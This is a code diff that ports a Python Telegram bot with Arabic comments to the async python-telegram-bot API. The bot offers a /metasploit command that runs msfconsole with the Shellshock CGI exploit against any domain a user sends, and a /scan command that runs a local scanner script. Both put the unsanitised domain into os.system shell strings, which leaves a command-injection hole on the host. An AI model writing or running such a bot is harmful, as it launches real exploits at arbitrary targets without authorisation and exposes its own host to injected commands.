@@ -1,5 +1,6 @@
 import os
-from telegram.ext import Updater, CommandHandler
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
 from dotenv import load_dotenv
 
 # تحميل المتغيرات من ملف .env
@@ -8,9 +9,9 @@ load_dotenv()
 # الحصول على التوكن من متغير البيئة
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 
-def start(update, context):
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # رسالة الترحيب مع معلومات عن البوت
-    update.message.reply_text(
+    await update.message.reply_text(
         "مرحبًا! 👋\n\n"
         "🔧 **تم تطوير هذا البوت بواسطة:**\n"
         "ماجد المهندس، مؤسس شركة **باج باونتي** في اليمن، وهي الأولى في هذا المجال.\n\n"
@@ -32,31 +33,34 @@ def start(update, context):
         "- [@helxone](https://t.me/helxone)"
     )
 
-def scan(update, context):
+async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = ' '.join(context.args)
     if not domain:
-        update.message.reply_text("يرجى إرسال اسم النطاق بعد الأمر /scan")
+        await update.message.reply_text("يرجى إرسال اسم النطاق بعد الأمر /scan")
         return
 
     # تنفيذ فحص باستخدام الأدوات التي تديرها في السكربت
     os.system(f"./scanner.sh {domain}")
-    update.message.reply_text(f"تم الانتهاء من فحص النطاق: {domain}. تحقق من الملفات الناتجة.")
+    await update.message.reply_text(f"تم الانتهاء من فحص النطاق: {domain}. تحقق من الملفات الناتجة.")
 
-def metasploit(update, context):
+async def metasploit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # استخدام Metasploit لتشغيل فحص أو استغلال
     domain = ' '.join(context.args)
     if not domain:
-        update.message.reply_text("يرجى إرسال اسم النطاق بعد الأمر /metasploit")
+        await update.message.reply_text("يرجى إرسال اسم النطاق بعد الأمر /metasploit")
         return
 
     # تكامل مع Metasploit باستخدام سكربت أو أوامر معينة
     os.system(f"msfconsole -x 'use exploit/unix/http/apache_mod_cgi_bash_env_exec; set RHOST {domain}; run'")
-    update.message.reply_text(f"تم تنفيذ هجوم Metasploit على النطاق: {domain}. تحقق من النتائج.")
+    await update.message.reply_text(f"تم تنفيذ هجوم Metasploit على النطاق: {domain}. تحقق من النتائج.")
 
-updater = Updater(BOT_TOKEN, use_context=True)
-updater.dispatcher.add_handler(CommandHandler("start", start))
-updater.dispatcher.add_handler(CommandHandler("scan", scan))
-updater.dispatcher.add_handler(CommandHandler("metasploit", metasploit))
+# تهيئة التطبيق
+application = Application.builder().token(BOT_TOKEN).build()
 
-updater.start_polling()
-updater.idle()
+# إضافة معالجات الأوامر
+application.add_handler(CommandHandler("start", start))
+application.add_handler(CommandHandler("scan", scan))
+application.add_handler(CommandHandler("metasploit", metasploit))
+
+# بدء البوت
+application.run_polling()
